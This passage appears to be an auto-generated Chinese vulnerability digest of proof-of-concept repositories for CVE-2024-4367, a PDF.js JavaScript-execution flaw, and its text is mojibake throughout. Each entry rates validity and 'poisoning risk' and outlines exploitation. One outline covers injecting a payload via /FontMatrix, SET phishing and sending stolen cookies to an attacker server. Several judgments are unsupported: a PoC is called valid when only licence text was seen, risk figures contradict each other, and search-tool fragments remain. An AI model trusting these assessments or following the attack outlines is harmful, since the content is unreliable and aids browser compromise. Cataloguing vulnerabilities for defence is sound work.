å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
